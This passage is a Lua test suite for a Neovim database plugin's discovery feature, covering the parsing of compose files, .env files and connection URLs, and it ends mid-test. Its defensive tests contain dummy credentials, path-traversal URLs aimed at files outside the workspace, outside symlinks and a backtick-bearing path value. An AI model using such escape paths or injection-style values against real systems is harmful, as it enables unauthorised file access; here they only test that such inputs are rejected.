--- Workspace discovery: the bounded walk, the three parsers, and the two properties that make the
--- feature safe — a discovered connection opens LOCKED, and a password it found is never written
--- to the connections file.
local compose = require('dblens.discovery.compose')
local connections = require('dblens.connections')
local discovery = require('dblens.discovery')
local env = require('dblens.discovery.env')
local files = require('dblens.discovery.files')
local h = require('helpers')
local url = require('dblens.discovery.url')

local eq = h.eq

--- The first bytes each engine writes, which is what tells a `.db` written by one from the other.
local SQLITE_HEADER = 'SQLite format 3\0'
local DUCKDB_HEADER = string.rep('\0', 8) .. 'DUCK'

local function write(path, text)
  vim.fn.mkdir(vim.fn.fnamemodify(path, ':h'), 'p')
  local file = assert(io.open(path, 'wb'), 'cannot write ' .. path)
  file:write(text)
  file:close()
  return path
end

local COMPOSE = [[
version: '3.8'
services:
  app:
    image: node:20
    ports:
      - "3000:3000"
  db:
    image: postgres:16-alpine
    ports:
      - "5433:5432"
    environment:
      POSTGRES_USER: shop
      POSTGRES_PASSWORD: hunter2
      POSTGRES_DB: shopdb
  metrics:
    image: mysql:8.4
    ports:
      - "127.0.0.1:3307:3306"
    environment:
      - MYSQL_DATABASE=metrics
      - MYSQL_USER=report
      - MYSQL_PASSWORD=reportpw
  cache:
    image: redis:7
    ports:
      - "6379:6379"
  internal:
    image: postgres:16
    expose:
      - "5432"
]]

local DOTENV = [[
# a comment
export DATABASE_URL=postgres://app:s3cr3t@localhost:5432/appdb
REDIS_URL=redis://localhost:6379
ANALYTICS_URL="duckdb:///srv/warehouse.duckdb"
PGDATABASE=grouped
PGHOST=pg.internal
PGPORT=6432
PGPASSWORD=grouppw
]]

local PREFIXED_DOTENV = [[
TACTICA_POSTGRES_DB=tactica
TACTICA_POSTGRES_USER=postgres
TACTICA_POSTGRES_PASSWORD=postgres
TACTICA_DB_PORT=5433
TACTICA_DATABASE_URL_DOCKER=postgresql+psycopg://postgres:postgres@db:5432/tactica
]]

local OPTS = { source = '.env', dir = '/srv/app' }

--- A workspace with every shape the walk has to get right.
---@return string root
local function fixture_workspace()
  local root = vim.fn.tempname()
  vim.fn.mkdir(root .. '/.git', 'p')
  -- Dev databases are normally gitignored, which is exactly why the walk cannot use git.
  write(root .. '/.gitignore', '*.sqlite3\n*.db\n')
  write(root .. '/db/dev.sqlite3', SQLITE_HEADER .. string.rep('\0', 64))
  write(root .. '/data/ambiguous.db', DUCKDB_HEADER .. string.rep('\0', 64))
  write(root .. '/data/plain.db', 'not a database yet')
  write(root .. '/node_modules/pkg/bundled.sqlite3', SQLITE_HEADER)
  write(root .. '/.git/objects/packed.sqlite3', SQLITE_HEADER)
  write(root .. '/a/b/c/d/e/f/g/too-deep.sqlite3', SQLITE_HEADER)
  write(root .. '/docker-compose.yml', COMPOSE)
  write(root .. '/.env', DOTENV)
  write(root .. '/.env.example', 'DATABASE_URL=postgres://user:pass@localhost:5432/example\n')
  return root
end

--- Run a scan to completion and return what it found.
---@return dblens.Candidate[] candidates, dblens.DiscoveryReport report
local function scan(root, bounds)
  local box = h.capture()
  discovery.scan({ root = root, bounds = bounds }, box.sink)
  vim.wait(5000, function()
    return box.called
  end)
  assert(box.called, 'discovery.scan never called back')
  return box[1], box[2]
end

---@return dblens.Candidate?
local function by_name(candidates, name)
  for _, candidate in ipairs(candidates) do
    if candidate.name == name then
      return candidate
    end
  end
  return nil
end

describe('discovery: the workspace walk', function()
  it('finds a gitignored database file, and names it by its path in the project', function()
    local candidates = scan(fixture_workspace())
    local found = by_name(candidates, 'db/dev.sqlite3')
    eq(found ~= nil, true, { fail_reason = 'the gitignored dev database was not found' })
    eq(found.kind, 'sqlite')
    eq(found.origin, 'file')
    eq(found.detail, '(sqlite, file)')
  end)

  it('classifies an ambiguous `.db` by its magic header, not its extension', function()
    local root = fixture_workspace()
    local candidates = scan(root)
    eq(by_name(candidates, 'data/ambiguous.db').kind, 'duckdb')
    -- No header to go on: `.db` defaults to sqlite, which is what it usually is.
    eq(by_name(candidates, 'data/plain.db').kind, 'sqlite')
    eq(files.kind_for(root .. '/db/dev.sqlite3'), 'sqlite')
    eq(files.kind_for(root .. '/docker-compose.yml'), nil)
  end)

  it('skips heavy directories and the git directory', function()
    local candidates = scan(fixture_workspace())
    eq(by_name(candidates, 'node_modules/pkg/bundled.sqlite3'), nil)
    eq(by_name(candidates, '.git/objects/packed.sqlite3'), nil)
  end)

  it('honours the depth bound', function()
    local root = fixture_workspace()
    eq(by_name(scan(root), 'a/b/c/d/e/f/g/too-deep.sqlite3'), nil)
    local shallow = scan(root, { max_depth = 1 })
    eq(by_name(shallow, 'db/dev.sqlite3') ~= nil, true)
    eq(by_name(shallow, 'a/b/c/d/e/f/g/too-deep.sqlite3'), nil)
  end)

  --- All four bounds report, not just two. The depth and hit caps used to prune silently, so a
  --- project whose databases sit below the depth bound got a confident "found no databases".
  it('says so when the depth bound or the hit cap pruned something', function()
    local _, deep = scan(fixture_workspace(), { max_depth = 2 })
    eq(deep.stats.truncated, true, { fail_reason = 'the depth bound pruned silently' })

    local _, capped = scan(fixture_workspace(), { max_hits = 1 })
    eq(capped.stats.truncated, true, { fail_reason = 'the hit cap pruned silently' })

    -- A walk that nothing stopped still reports the truth.
    local shallow = vim.fn.tempname()
    write(shallow .. '/dev.sqlite3', SQLITE_HEADER)
    local _, whole = scan(shallow)
    eq(whole.stats.truncated, false, { fail_reason = 'a complete walk claimed it was truncated' })
  end)

  it('stops at the entry cap and says so', function()
    local _, report = scan(fixture_workspace(), { max_entries = 3 })
    eq(report.stats.truncated, true)
    eq(report.stats.entries <= 4, true, { fail_reason = 'the cap did not stop the walk' })
  end)

  it('does not follow a symlink out of the workspace', function()
    local outside = vim.fn.tempname()
    write(outside .. '/secret/elsewhere.sqlite3', SQLITE_HEADER)
    local root = fixture_workspace()
    assert(vim.uv.fs_symlink(outside .. '/secret', root .. '/linked', { dir = true }))
    assert(vim.uv.fs_symlink(outside .. '/secret/elsewhere.sqlite3', root .. '/link.sqlite3'))

    local candidates = scan(root)
    for _, candidate in ipairs(candidates) do
      eq(candidate.name:find('link', 1, true), nil, {
        fail_reason = ('the walk followed a symlink: %s'):format(candidate.name),
      })
    end
  end)

  it('reports the root it scanned and finds every source in one pass', function()
    local root = fixture_workspace()
    local candidates, report = scan(root)
    eq(report.root, root)
    eq(report.read, 2, { fail_reason = 'the compose file and the .env should both be read' })
    local origins = {}
    for _, candidate in ipairs(candidates) do
      origins[candidate.origin] = true
    end
    eq(origins, { file = true, compose = true, env = true })
    -- Files first, so the picker preselects the most concrete candidate.
    eq(candidates[1].origin, 'file')
  end)

  it('ignores a `.env.example`, which holds placeholders rather than a database', function()
    local candidates = scan(fixture_workspace())
    for _, candidate in ipairs(candidates) do
      eq(candidate.source ~= '.env.example', true, {
        fail_reason = 'a template .env produced a candidate',
      })
    end
  end)
end)

describe('discovery: docker-compose', function()
  local function parsed()
    return compose.parse(COMPOSE, { source = 'docker-compose.yml' })
  end

  it('turns database services into candidates with the published host port', function()
    local services = parsed()
    eq(#services, 2, { fail_reason = 'only postgres and mysql are databases dblens can reach' })

    local postgres = services[1]
    eq(postgres.name, 'db')
    eq(postgres.kind, 'postgres')
    eq(postgres.target.host, 'localhost')
    eq(postgres.target.port, 5433)
    eq(postgres.target.user, 'shop')
    eq(postgres.target.database, 'shopdb')
    eq(postgres.secret, 'hunter2')

    local mysql = services[2]
    eq(mysql.kind, 'mysql')
    eq(mysql.target.port, 3307)
    eq(mysql.target.database, 'metrics')
    eq(mysql.target.user, 'report')
    eq(mysql.secret, 'reportpw')
  end)

  it('skips a service that publishes no host port, and one that is not a database', function()
    local names = {}
    for _, service in ipairs(parsed()) do
      names[service.name] = true
    end
    eq(names.internal, nil)
    eq(names.cache, nil)
    eq(names.app, nil)
  end)

  it('applies the image defaults when the environment leaves them out', function()
    local services = compose.parse(
      'services:\n  db:\n    image: postgres:16\n    ports:\n      - 5432:5432\n',
      { source = 'compose.yaml' }
    )
    eq(#services, 1)
    eq(services[1].target.user, 'postgres')
    eq(services[1].target.database, 'postgres')
    eq(services[1].secret, nil)
  end)

  it('resolves ${VAR} from the .env beside it, and drops a value it cannot resolve', function()
    local text = table.concat({
      'services:',
      '  db:',
      '    image: mariadb:11',
      '    ports:',
      '      - "${DB_PORT}:3306"',
      '    environment:',
      '      MARIADB_DATABASE: ${DB_NAME:-fallback}',
      '      MARIADB_ROOT_PASSWORD: ${NOT_SET_ANYWHERE}',
      '',
    }, '\n')
    local services = compose.parse(text, { source = 'compose.yml', vars = { DB_PORT = '3399' } })
    eq(#services, 1)
    eq(services[1].kind, 'mariadb')
    eq(services[1].target.port, 3399)
    eq(services[1].target.database, 'fallback')
    -- A literal `${NOT_SET_ANYWHERE}` is not a password, so the candidate carries none.
    eq(services[1].secret, nil)
  end)

  --- `ports: ["5432:5432"]` is at least as common as the block form. Reading only the block form
  --- meant a single-service compose file in that style discovered nothing at all.
  it('reads a published port from every shape a compose file writes one in', function()
    local SHAPES = {
      { name = 'inline flow, quoted', text = '    ports: ["55432:5432"]', port = 55432 },
      { name = 'inline flow, unquoted', text = '    ports: [55432:5432]', port = 55432 },
      {
        name = 'inline flow, ip:host:container',
        text = '    ports: ["127.0.0.1:55432:5432"]',
        port = 55432,
      },
      {
        name = 'inline flow, two items',
        text = '    ports: ["8080:80", "55432:5432"]',
        port = 55432,
      },
      { name = 'block, quoted', text = '    ports:\n      - "55432:5432"', port = 55432 },
      { name = 'block, unquoted', text = '    ports:\n      - 55432:5432', port = 55432 },
      {
        name = 'block, ip:host:container',
        text = '    ports:\n      - "127.0.0.1:55432:5432"',
        port = 55432,
      },
    }
    for _, shape in ipairs(SHAPES) do
      local text = 'services:\n  db:\n    image: postgres:16\n' .. shape.text .. '\n'
      local services = compose.parse(text, { source = 'compose.yml' })
      eq(#services, 1, { fail_reason = ('%s produced no candidate'):format(shape.name) })
      eq(services[1].target.port, shape.port, { fail_reason = shape.name })
    end
  end)

  it('reads an inline-flow environment list too', function()
    local text = 'services:\n  db:\n    image: mysql:8\n    ports: ["3307:3306"]\n'
      .. '    environment: ["MYSQL_DATABASE=shop", "MYSQL_USER=ada"]\n'
    local services = compose.parse(text, { source = 'compose.yml' })
    eq(#services, 1)
    eq(services[1].target.database, 'shop')
    eq(services[1].target.user, 'ada')
  end)

  it('publishes nothing for a container-only port, in either shape', function()
    for _, ports in ipairs({ '    ports: ["5432"]', '    ports:\n      - "5432"' }) do
      local text = 'services:\n  db:\n    image: postgres:16\n' .. ports .. '\n'
      eq(#compose.parse(text, { source = 'compose.yml' }), 0, {
        fail_reason = 'an ephemeral host port is not a target dblens can offer',
      })
    end
  end)

  it('reads the long port form, and knows which files are compose files', function()
    local text = 'services:\n  db:\n    image: postgres\n    ports:\n'
      .. '      - target: 5432\n        published: 5445\n        protocol: tcp\n'
    eq(compose.parse(text, { source = 'x.yml' })[1].target.port, 5445)
    eq(compose.is_compose_file('docker-compose.override.yml'), true)
    eq(compose.is_compose_file('compose.yaml'), true)
    eq(compose.is_compose_file('kubernetes.yml'), false)
  end)
end)

describe('discovery: connection URLs', function()
  it('parses a postgres URL with a password, a port and a query', function()
    local target = url.parse('postgres://app:s3cr3t@db.internal:6543/shop?sslmode=require')
    eq(target.kind, 'postgres')
    eq(target.host, 'db.internal')
    eq(target.port, 6543)
    eq(target.user, 'app')
    eq(target.database, 'shop')
    eq(target.sslmode, 'require')
    eq(target.secret, 's3cr3t')
  end)

  it('fills in the default port, and has no password when the URL carries none', function()
    local target = url.parse('postgresql://localhost/appdb')
    eq(target.port, 5432)
    eq(target.user, nil)
    eq(target.secret, nil)
    eq(url.parse('mysql://root@127.0.0.1/metrics').port, 3306)
    eq(url.parse('mysql://root@127.0.0.1:3307/metrics').port, 3307)
    eq(url.parse('mariadb://wiki@db/wiki').kind, 'mariadb')
  end)

  it('parses the file-backed schemes into a path', function()
    eq(url.parse('sqlite:///srv/app/dev.sqlite3').path, '/srv/app/dev.sqlite3')
    eq(url.parse('sqlite:///srv/app/dev.sqlite3').kind, 'sqlite')
    eq(url.parse('sqlite://./db/dev.sqlite3').path, './db/dev.sqlite3')
    eq(url.parse('sqlite:relative.db').path, 'relative.db')
    eq(url.parse('duckdb:///data/warehouse.duckdb').kind, 'duckdb')
    -- An in-memory database is not a file anything can open.
    eq(url.parse('sqlite://:memory:'), nil)
  end)

  it('percent-decodes the user info, so an awkward password survives', function()
    local target = url.parse('postgres://us%20er:p%40ss%2Fword@host/db')
    eq(target.user, 'us er')
    eq(target.secret, 'p@ss/word')
  end)

  --- An unencoded `/` in a password is invalid per RFC but routine in a real `.env`, and splitting
  --- the authority on the first `/` framed the password as the host: the user's own database then
  --- either never appeared, or appeared pointing somewhere it never meant.
  it('finds the host and the database when the password holds a `/`', function()
    local target = url.parse('postgres://user:aB3/xY9+z@db.example.com:5432/app')
    eq(target.host, 'db.example.com')
    eq(target.port, 5432)
    eq(target.user, 'user')
    eq(target.database, 'app')
    eq(target.secret, 'aB3/xY9+z')

    local my = url.parse('mysql://root:tOp/Secret@127.0.0.1:3306/shop')
    eq(my.host, '127.0.0.1')
    eq(my.database, 'shop')
    eq(my.secret, 'tOp/Secret')
  end)

  it('still reads an ordinary `@` in the path as part of the database name', function()
    local target = url.parse('postgres://db.example.com/app@v2')
    eq(target.host, 'db.example.com')
    eq(target.database, 'app@v2')
    eq(url.parse('postgres://ada@db.example.com/app@v2').user, 'ada')
    eq(url.parse('postgres://ada@db.example.com/app@v2').database, 'app@v2')
  end)

  it('is not fooled by a URL that is not a database', function()
    eq(url.parse('redis://localhost:6379'), nil)
    eq(url.parse('https://example.com/db'), nil)
    eq(url.parse('not a url'), nil)
  end)

  --- SQLAlchemy and Django spell the Python driver into the scheme. The engine is the same one;
  --- only the library that talks to it differs, and reading the whole scheme as the engine name
  --- made every Python project's own `.env` unreadable.
  it('reads a scheme that names its driver as the engine it names', function()
    local cases = {
      ['postgresql+psycopg://u:p@h/d'] = 'postgres',
      ['postgresql+psycopg2://u:p@h/d'] = 'postgres',
      ['postgresql+asyncpg://u:p@h/d'] = 'postgres',
      ['cockroachdb+psycopg://u@h:26257/d'] = 'postgres',
      ['mysql+pymysql://u:p@h/d'] = 'mysql',
      ['mysql+mysqldb://u:p@h/d'] = 'mysql',
      ['mariadb+pymysql://u:p@h/d'] = 'mariadb',
      ['mssql+pyodbc://u:p@h/d'] = 'mssql',
      ['sqlite+pysqlite:///db/dev.sqlite3'] = 'sqlite',
    }
    for text, kind in pairs(cases) do
      local target = url.parse(text)
      eq(target ~= nil, true, { fail_reason = text .. ' parsed as nothing' })
      eq(target.kind, kind, { fail_reason = text })
    end
    -- The rest of the URL still splits the same way.
    local target = url.parse('postgresql+psycopg://postgres:postgres@db:5432/tactica')
    eq({ target.host, target.port, target.user, target.database, target.secret }, {
      'db',
      5432,
      'postgres',
      'tactica',
      'postgres',
    })
    eq(url.parse('unknown+driver://u@h/d'), nil)
  end)

  it('reads a `jdbc:` URL by the engine nested behind it', function()
    eq(url.parse('jdbc:postgresql://host:6543/shop').kind, 'postgres')
    eq(url.parse('jdbc:postgresql://host:6543/shop').port, 6543)
    eq(url.parse('jdbc:mysql://host/metrics').database, 'metrics')
    eq(url.parse('jdbc:sqlite:/srv/dev.sqlite3').path, '/srv/dev.sqlite3')
    -- An engine dblens does not speak stays unparsed rather than becoming a guess.
    eq(url.parse('jdbc:h2:mem:test'), nil)
  end)

  --- The driver-specific spellings are exactly why `jdbc:` was left out before. They are read the
  --- ordinary way now, which yields no database rather than an invented target -- and a candidate
  --- without one never reaches the picker.
  it('offers nothing for a jdbc URL whose parameters are driver-specific', function()
    local target = url.parse('jdbc:sqlserver://host:1433;databaseName=shop')
    eq(target.database, nil)
    local candidate =
      { name = 'DB_URL', kind = target.kind, target = { host = target.host, port = target.port } }
    eq(connections.validate(discovery.to_spec(candidate)) ~= nil, true, {
      fail_reason = 'a driver-specific jdbc URL became an offerable connection',
    })
  end)
end)

describe('discovery: .env files', function()
  it('reads exported, quoted and commented pairs', function()
    local pairs_list = env.parse(DOTENV)
    local map = {}
    for _, entry in ipairs(pairs_list) do
      map[entry.key] = entry.value
    end
    eq(map.DATABASE_URL, 'postgres://app:s3cr3t@localhost:5432/appdb')
    eq(map.ANALYTICS_URL, 'duckdb:///srv/warehouse.duckdb')
    eq(map.PGPORT, '6432')
    eq(#pairs_list, 7, { fail_reason = 'the comment line is not a variable' })
  end)

  it('makes a candidate of every value that is a database URL, named after the variable', function()
    local candidates = env.candidates(DOTENV, { source = '.env', dir = '/srv/app' })
    local names = {}
    for _, candidate in ipairs(candidates) do
      names[candidate.name] = candidate
    end
    eq(names.DATABASE_URL.kind, 'postgres')
    eq(names.DATABASE_URL.target.database, 'appdb')
    eq(names.DATABASE_URL.secret, 's3cr3t')
    eq(names.REDIS_URL, nil)
    eq(names.ANALYTICS_URL.kind, 'duckdb')
    eq(names.ANALYTICS_URL.target.path, '/srv/warehouse.duckdb')
  end)

  it('resolves a file URL against the project when that is the file that exists', function()
    local project = vim.fn.tempname()
    write(project .. '/db/dev.sqlite3', SQLITE_HEADER)
    local text = 'DATABASE_URL=sqlite:///db/dev.sqlite3\n'
    eq(
      env.candidates(text, { source = '.env', dir = project })[1].target.path,
      project .. '/db/dev.sqlite3'
    )
    -- Nothing to go on: the path stays as the URL wrote it.
    eq(
      env.candidates(text, { source = '.env', dir = '/nowhere' })[1].target.path,
      '/db/dev.sqlite3'
    )
  end)

  it('reads a PG* variable group as a connection', function()
    local candidates = env.candidates(DOTENV, { source = '.env', dir = '/srv/app' })
    local grouped = nil
    for _, candidate in ipairs(candidates) do
      if candidate.name == 'grouped' then
        grouped = candidate
      end
    end
    eq(grouped ~= nil, true, { fail_reason = 'the PG* group produced no candidate' })
    eq(grouped.kind, 'postgres')
    eq(grouped.target.host, 'pg.internal')
    eq(grouped.target.port, 6432)
    eq(grouped.secret, 'grouppw')
  end)

  it('needs a database to be named before a variable group is a connection', function()
    eq(#env.candidates('PGHOST=db\nPGPASSWORD=x\n', { source = '.env', dir = '/srv' }), 0)
    local nameless = 'X_POSTGRES_USER=u\nX_POSTGRES_PASSWORD=p\nX_DB_PORT=5433\n'
    eq(#env.candidates(nameless, OPTS), 0, {
      fail_reason = 'a prefixed group with no database became a candidate',
    })
  end)
end)

--- The shape a real Python project's `.env` has: every variable under the project's own prefix,
--- the published host port named on its own, and a SQLAlchemy URL pointing at the compose service
--- rather than at anything this machine can reach.
describe('discovery: project-prefixed .env groups', function()
  it('reads the group, taking the host port from the `<P>_DB_PORT` beside it', function()
    local found = by_name(env.candidates(PREFIXED_DOTENV, OPTS), 'tactica')
    eq(found ~= nil, true, { fail_reason = 'the prefixed group produced no candidate' })
    eq(found.kind, 'postgres')
    eq(found.target.host, 'localhost', { fail_reason = 'an absent host must be localhost' })
    eq(found.target.port, 5433)
    eq(found.target.user, 'postgres')
    eq(found.target.database, 'tactica')
    eq(found.secret, 'postgres')
    eq(found.source, '.env')
  end)

  --- The URL names a container: reachable from a sibling service, not from the editor. It is
  --- still offered -- only the user knows whether the stack is up -- but it must not be the only
  --- thing offered when the same file says which port that database answers on here.
  it('offers the localhost connection beside the one naming the container', function()
    local candidates = env.candidates(PREFIXED_DOTENV, OPTS)
    local internal = by_name(candidates, 'TACTICA_DATABASE_URL_DOCKER')
    eq(internal.target.host, 'db')
    eq(internal.target.port, 5432)
    local reachable = by_name(candidates, 'tactica')
    eq({ reachable.target.host, reachable.target.port }, { 'localhost', 5433 })
  end)

  it('keeps several prefixes in one file apart, postgres and mysql alike', function()
    local candidates = env.candidates(
      [[
SHOP_POSTGRES_DB=shop
SHOP_POSTGRES_USER=shopper
SHOP_POSTGRES_PASSWORD=shoppw
SHOP_DB_PORT=5440
WAREHOUSE_MYSQL_DATABASE=warehouse
WAREHOUSE_MYSQL_USER=wh
WAREHOUSE_MYSQL_PASSWORD=whpw
WAREHOUSE_DB_PORT=3310
]],
      OPTS
    )
    eq(#candidates, 2)
    local shop, warehouse = by_name(candidates, 'shop'), by_name(candidates, 'warehouse')
    eq({ shop.kind, shop.target.port, shop.secret }, { 'postgres', 5440, 'shoppw' })
    eq({ warehouse.kind, warehouse.target.port, warehouse.secret }, { 'mysql', 3310, 'whpw' })
  end)

  --- `PORT` and `HOST` on their own are the web server's, in every framework there is. Reading
  --- them as a database's would offer a connection to the application itself.
  it('reads no connection out of a bare PORT or HOST', function()
    eq(#env.candidates('PORT=8000\nHOST=0.0.0.0\nNAME=my-app\n', OPTS), 0)
  end)

  it('names no engine it was not told: a generic group needs one from the file', function()
    local mute = 'APP_DB_HOST=localhost\nAPP_DB_PORT=9999\nAPP_DB_NAME=appdb\n'
    eq(#env.candidates(mute, OPTS), 0, { fail_reason = 'an engine was invented for a bare group' })
    -- A URL under the same prefix says which engine it is; so does a port only one engine uses.
    local told = 'APP_DATABASE_URL=mysql+pymysql://u:p@db:3306/appdb\n' .. mute
    eq(by_name(env.candidates(told, OPTS), 'appdb').kind, 'mysql')
    local by_port = mute:gsub('9999', '5432')
    eq(by_name(env.candidates(by_port, OPTS), 'appdb').kind, 'postgres')
  end)

  --- The whole pipeline over a real directory: the walk finds the file, the group is read, and
  --- what comes out is an offerable connection with its provenance on it.
  it('reaches the picker from a real workspace, provenance and all', function()
    local root = vim.fn.tempname()
    vim.fn.mkdir(root .. '/.git', 'p')
    write(root .. '/.env', PREFIXED_DOTENV)
    local candidates = scan(root)
    local found = by_name(candidates, 'tactica')
    eq(found ~= nil, true, { fail_reason = 'the walk offered no localhost candidate' })
    eq(found.detail, '(postgres, localhost:5433/tactica, from .env)')
    eq(
      by_name(candidates, 'TACTICA_DATABASE_URL_DOCKER').detail,
      '(postgres, db:5432/tactica, from .env)'
    )
    eq(connections.validate(discovery.to_spec(found)), nil)
  end)

  it("never writes a prefixed group's password to the connections file", function()
    local base = vim.fn.tempname()
    vim.fn.mkdir(base, 'p')
    local options =
      require('dblens.config').setup({ connections_file = base .. '/connections.json' })
    -- The group alone, so the password under test is the group's own and not a URL's.
    local text = [[
TACTICA_POSTGRES_DB=tactica
TACTICA_POSTGRES_USER=postgres
TACTICA_POSTGRES_PASSWORD=pref-s3cr3t
TACTICA_DB_PORT=5433
]]
    local candidate = by_name(env.candidates(text, OPTS), 'tactica')
    eq(candidate.secret, 'pref-s3cr3t')
    local spec = discovery.to_spec(candidate)
    eq(spec.password, nil)
    eq(spec.password_env, nil)
    eq(spec.password_cmd, nil)
    eq(h.leaks(spec, 'pref-s3cr3t'), false, { fail_reason = 'the password reached the spec' })

    local ok, err = connections.save(options, { spec })
    eq(ok, true, { fail_reason = tostring(err) })
    local written = assert(io.open(options.connections_file, 'r'), 'nothing was written')
    local stored = written:read('*a')
    written:close()
    eq(stored:find('pref-s3cr3t', 1, true), nil, { fail_reason = 'the password was persisted' })
    eq(stored:find('tactica', 1, true), nil, { fail_reason = 'the connection was persisted' })
  end)
end)

--- `tonumber` alone accepts negatives, fractions, hex, `inf`/exponents past 65535, and infinity —
--- none of those are a port, and unchecked they reach the client's argv verbatim.
describe('discovery: .env port validation', function()
  local function port_of(value)
    local text = ('X_POSTGRES_DB=shop\nX_POSTGRES_HOST=h\nX_POSTGRES_PORT=%s\n'):format(value)
    return by_name(env.candidates(text, OPTS), 'shop').target.port
  end

  it('drops an out-of-range or non-integer port, falling back to the engine default', function()
    local DEFAULT_POSTGRES_PORT = 5432
    for _, bad in ipairs({ '-1', 'inf', '1e999', '999999999999', '5432.5' }) do
      eq(port_of(bad), DEFAULT_POSTGRES_PORT, { fail_reason = 'accepted bad port ' .. bad })
    end
  end)

  it('keeps a valid port written in hex or scientific notation', function()
    eq(port_of('0x1F'), 31)
    eq(port_of('5e3'), 5000)
  end)

  it('drops an out-of-range port parsed out of a URL too, not just a PORT variable', function()
    local text = 'DATABASE_URL=postgres://u:p@h:999999999999/shop\n'
    eq(by_name(env.candidates(text, OPTS), 'DATABASE_URL').target.port, 5432)
  end)
end)

--- `inferred_kind` used to scan every URL for every engine-less group (O(groups x urls)); it now
--- looks its own prefix up in a table built once. Both properties are tested: the lookup stays
--- correct on the fixtures above, and a large adversarial file (many groups, none matching any of
--- many URLs — the previous worst case) still resolves quickly.
describe('discovery: inferred_kind stays correct and fast on many groups and urls', function()
  it(
    'is not O(groups x urls): a large adversarial .env resolves well under the quadratic cost',
    function()
      local n = 1500
      local lines = {}
      for i = 1, n do
        -- Every group's prefix is unique and shares none with the URLs below, so the old linear
        -- scan would run to the end of `vars.urls` on every single one of these.
        lines[#lines + 1] = ('G%d_DB_HOST=localhost\n'):format(i)
        lines[#lines + 1] = ('G%d_DB_PORT=9999\n'):format(i) -- not a single-engine port either
        lines[#lines + 1] = ('G%d_DB_NAME=db%d\n'):format(i, i)
        lines[#lines + 1] = ('U%d_URL=postgres://u:p@host%d:5432/u%d\n'):format(i, i, i)
      end
      local text = table.concat(lines)

      local started = vim.uv.hrtime()
      local candidates = env.candidates(text, OPTS)
      local elapsed_ms = (vim.uv.hrtime() - started) / 1e6

      eq(#candidates, n, { fail_reason = 'expected exactly one candidate per unmatched group' })
      -- Quadratic here (n=1500 groups x 1500 urls) would cost hundreds of ms; bucketed lookup does
      -- not, so a generous bound still catches a regression back to the linear scan.
      eq(elapsed_ms < 500, true, {
        fail_reason = ('inferred_kind took %.1fms for n=%d — looks quadratic again'):format(
          elapsed_ms,
          n
        ),
      })
    end
  )

  it(
    'yields the same candidate the linear scan would: URL under the matching prefix wins',
    function()
      local text = 'P_URL=mysql://u:p@h:3306/pdb\n'
        .. 'P_DB_HOST=localhost\nP_DB_PORT=9999\nP_DB_NAME=pdb2\n'
        .. 'Q_DB_HOST=localhost\nQ_DB_PORT=5432\nQ_DB_NAME=qdb\n' -- no URL under Q_, falls to PORT_KINDS
      local candidates = env.candidates(text, OPTS)
      eq(
        by_name(candidates, 'pdb2').kind,
        'mysql',
        { fail_reason = 'prefix-matched URL not found' }
      )
      eq(
        by_name(candidates, 'qdb').kind,
        'postgres',
        { fail_reason = 'single-engine port fallback broke' }
      )
    end
  )
end)

describe('discovery: what a candidate becomes', function()
  local function url_candidate()
    local candidates =
      env.candidates(DOTENV, { source = '.env', dir = vim.fn.tempname() .. '/app' })
    return by_name(candidates, 'DATABASE_URL')
  end

  it('is a LOCKED connection, whatever it was discovered from', function()
    local spec = discovery.to_spec(url_candidate())
    eq(spec.read_only, true)
    eq(spec.source, 'discovered')
    eq(connections.validate(spec), nil)

    local session = require('dblens.session').new(spec, require('dblens.config').get())
    eq(session:is_read_only(), true)
    eq(session:mode(), 'LOCKED')
  end)

  it('carries no password and no password reference into the spec', function()
    local candidate = url_candidate()
    eq(candidate.secret, 's3cr3t')
    local spec = discovery.to_spec(candidate)
    eq(spec.password_env, nil)
    eq(spec.password_cmd, nil)
    eq(h.leaks(spec, 's3cr3t'), false, { fail_reason = 'the password reached the spec' })
  end)

  it('never writes a discovered password, or the connection itself, to the file', function()
    local base = vim.fn.tempname()
    vim.fn.mkdir(base, 'p')
    local options =
      require('dblens.config').setup({ connections_file = base .. '/connections.json' })
    local spec = discovery.to_spec(url_candidate())

    local ok, err = connections.save(options, { spec })
    eq(ok, true, { fail_reason = tostring(err) })
    local written = assert(io.open(options.connections_file, 'r'), 'nothing was written')
    local text = written:read('*a')
    written:close()
    eq(text:find('s3cr3t', 1, true), nil, { fail_reason = 'the password was persisted' })
    eq(text:find('appdb', 1, true), nil, { fail_reason = 'the connection was persisted' })
  end)

  it('gives every candidate a unique name, and never one a real connection owns', function()
    local root = vim.fn.tempname()
    write(root .. '/db/dev.sqlite3', SQLITE_HEADER)
    write(root .. '/other/dev.sqlite3', SQLITE_HEADER)
    local box = h.capture()
    discovery.scan({ root = root, taken = { 'db/dev.sqlite3' } }, box.sink)
    vim.wait(5000, function()
      return box.called
    end)
    local names = {}
    for _, candidate in ipairs(box[1]) do
      eq(names[candidate.name], nil, { fail_reason = 'duplicate candidate name' })
      names[candidate.name] = true
    end
    eq(names['db/dev.sqlite3'], nil, { fail_reason = 'a taken name was handed out again' })
    eq(names['db/dev.sqlite3 (2)'], true)
  end)

  it('drops a candidate that would not validate as a connection', function()
    -- A percent-encoded backtick decodes into a path `dblens.path` refuses, so the candidate is
    -- never offered rather than reaching a client at connect time.
    local line = 'DATABASE_URL=sqlite:///srv/ba%60d.db\n'
    eq(#env.candidates(line, { source = '.env', dir = '/srv' }), 1, {
      fail_reason = 'the parser should still produce the raw candidate',
    })
    local root = vim.fn.tempname()
    write(root .. '/.env', line)
    local found, report = scan(root)
    eq(#found, 0)
    eq(report.skipped, 1)
  end)

  --- "never reads above the workspace root" is stated in the module header, the README and the
  --- CHANGELOG. The WALK honoured it; a path a `.env` NAMED did not, and `sqlite:///../x.db`
  --- resolved straight out of the project.
  it('drops a discovered file path that resolves above the workspace root', function()
    local base = vim.fn.tempname()
    local outside = base .. '/outside'
    write(outside .. '/secret.db', SQLITE_HEADER)
    local absolute_outside = vim.fs.normalize(assert(vim.uv.fs_realpath(outside .. '/secret.db')))

    local ESCAPES = {
      'sqlite:///../outside/secret.db',
      'sqlite://../outside/secret.db',
      'sqlite://' .. absolute_outside,
      'duckdb:///' .. absolute_outside,
    }
    for index, spelling in ipairs(ESCAPES) do
      local root = ('%s/project%d'):format(base, index)
      write(root .. '/.env', ('T%d=%s\n'):format(index, spelling))
      local found, report = scan(root)
      eq(#found, 0, { fail_reason = ('`%s` was offered'):format(spelling) })
      eq(report.skipped >= 1, true, {
        fail_reason = ('`%s` was dropped silently'):format(spelling),
      })
    end
  end)

  it('still offers a file path that stays inside the workspace', function()
    -- Under `vendor/`, which the walk skips, so the surviving candidate is the `.env` one and the
    -- assertion is about containment rather than about the walk finding the file itself.
    local root = vim.fn.tempname()
